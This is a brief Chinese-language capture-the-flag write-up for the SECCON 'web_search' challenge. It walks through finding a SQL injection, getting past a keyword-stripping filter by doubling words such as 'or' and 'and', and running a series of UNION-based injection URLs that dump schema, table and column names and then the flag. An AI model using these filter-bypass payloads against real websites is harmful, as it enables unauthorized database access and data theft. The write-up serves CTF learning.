# web_search

塞一個單引號 => 噴Error

塞兩個單引號 => 正常

塞`'#` => 正常

到此可以確定是SQL Injection

接著試著踹一下，可以發現他會把一些字串取代成空字串，例如:

`or`, `and`, `%20`, `,`, ...

但繞過方式很簡單，例如`or`就換成`oorr`，`and`就換成`anandd`，`,`可以用JOIN的方式換掉

試著構造`'or 2=2 #`，會發現噴了`The flag is "SECCON{Yeah_Sqli_Success_" ... well, the rest of flag is in "flag" table. Try more!`

接著就是深入db找後半flag

<br>

所以我們就能構造出UNION based的SQL injection:

http://web-search.chal.seccon.jp/?q=%27anandd/**/1=2/**/union/**/select/**/*/**/from/**/((SELECT/**/1)a/**/JOIN/**/(SELECT/**/2)b/**/JOIN/**/(select/**/3)c)%23

撈庫名:

http://web-search.chal.seccon.jp/?q='anandd/**/1=2/**/union/**/select/**/*/**/from/**/((SELECT/**/(schema_name)/**/from/**/infoorrmation_schema.schemata)a/**/JOIN/**/(SELECT/**/2)b/**/JOIN/**/(select/**/3)c)%23

=> seccon_sqli

撈表名:

http://web-search.chal.seccon.jp/?q=%27anandd/**/1=2/**/union/**/select/**/*/**/from/**/((SELECT/**/(table_name)/**/from/**/infoorrmation_schema.tables)a/**/JOIN/**/(SELECT/**/2)b/**/JOIN/**/(select/**/3)c)%23

=> flag

撈欄位名:

http://web-search.chal.seccon.jp/?q=%27anandd/**/1=2/**/union/**/select/**/*/**/from/**/((SELECT/**/(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name=%27flag%27)a/**/JOIN/**/(SELECT/**/2)b/**/JOIN/**/(select/**/3)c)%23


=> piece


撈後半flag:

http://web-search.chal.seccon.jp/?q=%27anandd/**/1=2/**/union/**/select/**/*/**/from/**/((SELECT/**/(piece)/**/from/**/flag)a/**/JOIN/**/(SELECT/**/2)b/**/JOIN/**/(select/**/3)c)%23

=> `You_Win_Yeah}`



